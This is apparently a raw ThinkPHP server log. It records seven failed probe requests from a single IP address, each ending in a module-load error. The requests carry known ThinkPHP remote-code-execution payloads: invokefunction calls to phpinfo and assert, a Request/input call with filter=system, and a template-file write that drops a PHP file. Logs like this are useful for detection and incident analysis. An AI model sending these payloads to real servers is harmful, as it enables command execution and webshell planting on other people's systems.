[ 2024-03-28T00:35:51+08:00 ] 103.17.149.37 /index.php?s=index/think\app/invokefunction&function=phpinfo&vars[0]=-1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
INFO: [ app_init ] --END-- [ RunTime:0.000642s ]
ERR: 无法加载模块:Index

[ 2024-03-28T02:12:18+08:00 ] 103.17.149.37 /?s=index/index
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000034s ]
INFO: [ app_init ] --END-- [ RunTime:0.000641s ]
ERR: 无法加载模块:Index

[ 2024-03-28T04:30:08+08:00 ] 103.17.149.37 /?s=index/think/Request/input&filter=system&data=echo%20www_admin_com
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000770s ]
ERR: 无法加载模块:Index

[ 2024-03-28T06:41:16+08:00 ] 103.17.149.37 /?s=index/think/app/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: [ app_init ] --END-- [ RunTime:0.000653s ]
ERR: 无法加载模块:Index

[ 2024-03-28T07:14:34+08:00 ] 103.17.149.37 /index.php?s=index/think\app/invokefunction&function=phpinfo&vars[0]=-1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
INFO: [ app_init ] --END-- [ RunTime:0.000535s ]
ERR: 无法加载模块:Index

[ 2024-03-28T08:54:38+08:00 ] 103.17.149.37 /?s=index/thinktemplatedriverfile/write&cacheFile=apiss.php&content=%3C?php%20phpinfo();?%3E
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000037s ]
INFO: [ app_init ] --END-- [ RunTime:0.000707s ]
ERR: 无法加载模块:Index

[ 2024-03-28T13:43:18+08:00 ] 103.17.149.37 /?s=index/think/app/invokefunction&function=call_user_func_array&vars%5B0%5D=assert&vars%5B1%5D%5B0%5D=phpinfo();
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000569s ]
ERR: 无法加载模块:Index

